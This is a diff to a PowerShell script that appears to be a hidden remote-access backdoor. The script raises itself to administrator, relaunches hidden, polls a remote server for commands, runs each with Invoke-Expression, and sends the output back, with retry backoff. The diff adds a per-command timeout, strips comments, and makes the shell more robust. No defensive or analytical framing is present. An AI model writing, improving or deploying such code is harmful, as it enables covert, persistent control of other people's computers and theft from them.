@@ -3,6 +3,7 @@ $logFile = Join-Path $PSScriptRoot "shell.txt"
 $maxLogSizeMB = 5
 $retryCount = 0
 $maxRetries = 10
+$cmdTimeout = 30  # seconds — kills commands that run longer than this
 
 # --- Self-elevate to admin and relaunch hidden ---
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
@@ -22,19 +23,17 @@ function Write-Log {
     $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     $line = "[$ts] [$Level] $Message"
     try {
-        # Rotate log if too large
         if (Test-Path $logFile) {
             $size = (Get-Item $logFile).Length / 1MB
             if ($size -ge $maxLogSizeMB) {
-                $backupPath = "$logFile.old"
-                Move-Item -Path $logFile -Destination $backupPath -Force
+                Move-Item -Path $logFile -Destination "$logFile.old" -Force
             }
         }
         Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
     } catch {}
 }
 
-# --- Lightweight HTTP helpers using WebClient (lower overhead than Invoke-WebRequest) ---
+# --- Lightweight HTTP helpers ---
 function Get-Command-From-Server {
     try {
         $wc = New-Object System.Net.WebClient
@@ -60,10 +59,37 @@ function Send-Result-To-Server {
     }
 }
 
+# --- Execute command with timeout ---
+function Invoke-CommandWithTimeout {
+    param([string]$Command, [int]$Timeout)
+
+    $job = Start-Job -ScriptBlock {
+        param($cmd)
+        try {
+            Invoke-Expression $cmd 2>&1 | Out-String
+        } catch {
+            "Error: " + $_.Exception.Message
+        }
+    } -ArgumentList $Command
+
+    $finished = $job | Wait-Job -Timeout $Timeout
+
+    if ($finished) {
+        $output = Receive-Job $job
+    } else {
+        Stop-Job $job
+        $output = "[!] Command timed out after ${Timeout}s. Partial output may be lost.`n"
+        Write-Log "Command timed out: $Command" "WARN"
+    }
+
+    Remove-Job $job -Force
+    return ($output | Out-String)
+}
+
 # --- Main loop ---
 function Connect-Cloudflare {
-    $idleDelay = 1        # seconds between polls when idle
-    $activeDelay = 0.3    # seconds between polls after a command (expect follow-ups)
+    $idleDelay = 1
+    $activeDelay = 0.3
     $currentDelay = $idleDelay
     $consecutiveIdle = 0
 
@@ -85,11 +111,7 @@ function Connect-Cloudflare {
                     break
                 }
 
-                try {
-                    $result = Invoke-Expression $command 2>&1 | Out-String
-                } catch {
-                    $result = "Error: " + $_.Exception.Message
-                }
+                $result = Invoke-CommandWithTimeout -Command $command -Timeout $cmdTimeout
 
                 Write-Log "OUT: $($result.Substring(0, [Math]::Min($result.Length, 200)))"
 
@@ -97,7 +119,6 @@ function Connect-Cloudflare {
                 Send-Result-To-Server -Body $body
             }
             else {
-                # No command — gradually slow down polling to save resources
                 $consecutiveIdle++
                 if ($consecutiveIdle -gt 10) {
                     $currentDelay = $idleDelay
@@ -110,7 +131,6 @@ function Connect-Cloudflare {
             $retryCount++
             Write-Log "Connection error #$retryCount : $($_.Exception.Message)" "ERROR"
 
-            # Exponential backoff: 2s, 4s, 8s, 16s ... capped at 60s
             $backoff = [Math]::Min(60, [Math]::Pow(2, $retryCount))
             Start-Sleep -Seconds $backoff
 
@@ -120,7 +140,6 @@ function Connect-Cloudflare {
             }
         }
 
-        # Periodic GC to keep memory low (every ~100 iterations)
         if (($consecutiveIdle % 100) -eq 0 -and $consecutiveIdle -gt 0) {
             [System.GC]::Collect()
         }
